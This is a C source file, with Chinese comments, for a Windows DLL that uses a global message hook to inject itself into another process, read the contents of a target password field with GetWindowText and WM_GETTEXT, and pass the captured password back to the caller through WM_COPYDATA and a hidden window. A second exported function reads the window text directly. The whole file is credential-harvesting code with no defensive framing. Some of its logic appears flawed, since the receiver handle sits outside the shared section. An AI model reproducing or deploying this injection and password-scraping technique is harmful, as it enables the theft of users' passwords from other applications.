/* hook_reader.c - Version 5 */
/* 使用隐藏窗口 + WM_COPYDATA 从注入的DLL回传密码 */
#include <windows.h>

static HMODULE g_hModule = NULL;
static HHOOK g_hk = NULL;
static HWND g_receiverHwnd = NULL;  /* 接收WM_COPYDATA的窗口 */

#pragma data_seg(".SHARED")
static HWND  g_targetHwnd = NULL;
static volatile BOOL g_active = FALSE;
#pragma data_seg()
#pragma comment(linker, "/SECTION:.SHARED,RWS")

/* 注册一个唯一消息 */
static UINT WM_HOOKREAD_PWD = 0;

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && g_active && g_targetHwnd && IsWindow(g_targetHwnd)) {
        HWND target = g_targetHwnd;
        WCHAR pwd[512] = {0};

        /* 在目标进程内读取密码 */
        /* GetWindowTextW - 同进程有效 */
        int len = GetWindowTextW(target, pwd, 512);

        /* WM_GETTEXT - 同进程有效 */
        if (len <= 0 || pwd[0] == 0) {
            LRESULT tl = SendMessageW(target, WM_GETTEXTLENGTH, 0, 0);
            if (tl > 0 && tl < 511) {
                SendMessageW(target, WM_GETTEXT, (WPARAM)(tl + 1), (LPARAM)pwd);
            }
        }

        /* 最后尝试 */
        if (pwd[0] == 0) {
            SendMessageW(target, WM_GETTEXT, (WPARAM)512, (LPARAM)pwd);
        }

        /* 通过 WM_COPYDATA 发送回接收窗口 */
        if (pwd[0] != 0 && g_receiverHwnd && IsWindow(g_receiverHwnd)) {
            COPYDATASTRUCT cds;
            cds.dwData = 0x50574400;  /* "PWD" magic */
            cds.cbData = (lstrlenW(pwd) + 1) * sizeof(WCHAR);
            cds.lpData = pwd;
            SendMessageW(g_receiverHwnd, WM_COPYDATA, 0, (LPARAM)&cds);
        }

        g_active = FALSE;
    }
    return CallNextHookEx(g_hk, nCode, wParam, lParam);
}

/* 导出: 通过钩子注入读取密码 */
__declspec(dllexport) BOOL __stdcall ReadPasswordViaHook(HWND hwnd, WCHAR* outBuf, int bufSize, int timeoutMs) {
    if (!hwnd || !IsWindow(hwnd) || !outBuf || bufSize <= 0)
        return FALSE;

    outBuf[0] = 0;

    if (!g_hModule)
        return FALSE;

    /* 注册消息 */
    if (!WM_HOOKREAD_PWD)
        WM_HOOKREAD_PWD = RegisterWindowMessageW(L"HookReaderPwdMessage");

    /* 创建一个隐藏接收窗口（在当前进程） */
    if (!g_receiverHwnd) {
        WNDCLASSEXW wc = {0};
        wc.cbSize = sizeof(wc);
        wc.lpfnWndProc = DefWindowProcW;
        wc.hInstance = g_hModule;
        wc.lpszClassName = L"HookReaderReceiver";
        RegisterClassExW(&wc);

        g_receiverHwnd = CreateWindowExW(0, L"HookReaderReceiver", L"",
                                          0, 0, 0, 0, 0,
                                          HWND_MESSAGE, NULL, g_hModule, NULL);
    }

    DWORD tid = GetWindowThreadProcessId(hwnd, NULL);
    if (!tid)
        return FALSE;

    g_targetHwnd = hwnd;
    g_receiverHwnd = g_receiverHwnd;
    g_active = TRUE;

    g_hk = SetWindowsHookExW(WH_GETMESSAGE, HookProc, g_hModule, tid);
    if (!g_hk) {
        g_active = FALSE;
        return FALSE;
    }

    /* 触发钩子 */
    PostThreadMessageW(tid, WM_NULL, 0, 0);
    PostMessageW(hwnd, WM_NULL, 0, 0);

    /* 等待 */
    int waited = 0;
    while (g_active && waited < timeoutMs) {
        /* 处理消息队列以接收WM_COPYDATA */
        MSG msg;
        while (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE)) {
            if (msg.message == WM_COPYDATA) {
                COPYDATASTRUCT* pcds = (COPYDATASTRUCT*)msg.lParam;
                if (pcds && pcds->dwData == 0x50574400 && pcds->cbData > 0) {
                    WCHAR* pwd = (WCHAR*)pcds->lpData;
                    int copyLen = min(pcds->cbData / sizeof(WCHAR), bufSize - 1);
                    wcsncpy(outBuf, pwd, copyLen);
                    outBuf[copyLen] = 0;
                    g_active = FALSE;
                }
            }
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        if (g_active) {
            Sleep(5);
            waited += 5;
        }
    }

    if (g_hk) { UnhookWindowsHookEx(g_hk); g_hk = NULL; }
    g_active = FALSE;

    return (outBuf[0] != 0);
}

__declspec(dllexport) BOOL __stdcall ReadPasswordDirect(HWND hwnd, WCHAR* outBuf, int bufSize, int timeoutMs) {
    if (!hwnd || !IsWindow(hwnd) || !outBuf || bufSize <= 0)
        return FALSE;
    outBuf[0] = 0;

    {
        WCHAR tmp[512];
        int len = GetWindowTextW(hwnd, tmp, 512);
        if (len > 0 && tmp[0] != 0) {
            wcsncpy(outBuf, tmp, bufSize - 1);
            outBuf[bufSize - 1] = 0;
            return TRUE;
        }
    }

    {
        LRESULT len = SendMessageTimeoutW(hwnd, WM_GETTEXTLENGTH, 0, 0,
                                           SMTO_ABORTIFHUNG, timeoutMs / 2, NULL);
        if (len > 0 && len < bufSize - 1) {
            LRESULT ret = SendMessageTimeoutW(hwnd, WM_GETTEXT, (WPARAM)(len + 1), (LPARAM)outBuf,
                                               SMTO_ABORTIFHUNG, timeoutMs / 2, NULL);
            if (ret > 0 && outBuf[0] != 0)
                return TRUE;
        }
    }

    return FALSE;
}

BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH) {
        g_hModule = h;
        DisableThreadLibraryCalls(h);
    } else if (reason == DLL_PROCESS_DETACH) {
        if (g_hk) { UnhookWindowsHookEx(g_hk); g_hk = NULL; }
    }
    return TRUE;
}
